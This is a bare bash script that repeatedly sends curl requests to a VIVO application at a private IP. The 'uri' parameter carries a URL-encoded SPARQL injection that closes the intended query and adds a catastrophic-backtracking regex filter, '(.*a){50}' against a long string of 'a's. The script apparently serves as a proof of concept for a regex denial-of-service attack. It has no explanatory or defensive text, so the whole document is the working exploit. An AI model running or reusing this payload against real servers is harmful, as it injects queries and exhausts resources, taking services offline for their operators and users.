#!/bin/bash
for i in {1..8}
do
    curl -m 1 http://172.18.0.10:8080/vivo/individual?uri=http%3A%2F%2Fvivoweb.org%2Fontology%2Fcore%23FacultyMember%3E%20%3Fp%20%3Fo%20.%20FILTER%20regex%28%22aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%21%22%2C%20%22%28.%2Aa%29%7B50%7D%22%29%20%7D%20%23%20
done
